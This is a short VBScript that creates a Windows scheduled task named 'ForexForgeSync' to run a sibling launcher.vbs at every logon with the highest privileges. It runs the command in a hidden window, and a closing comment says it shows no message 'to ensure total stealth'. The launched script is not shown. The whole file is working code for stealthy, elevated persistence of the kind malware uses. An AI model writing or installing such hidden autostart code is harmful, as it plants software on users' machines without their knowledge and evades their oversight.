Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get the folder path where this script is located
strPath = fso.GetParentFolderName(WScript.ScriptFullName)
strLauncher = strPath & "\launcher.vbs"

' Create the task to run launcher.vbs silently on logon
' 0 = Hidden window, True = Wait for command to finish
strTask = "schtasks /create /tn ""ForexForgeSync"" /tr ""wscript.exe \""" & strLauncher & "\"" "" /sc onlogon /rl highest /delay 0001:00 /f"
WshShell.Run "cmd.exe /c " & strTask, 0, True

' Script ends here with NO MsgBox to ensure total stealth
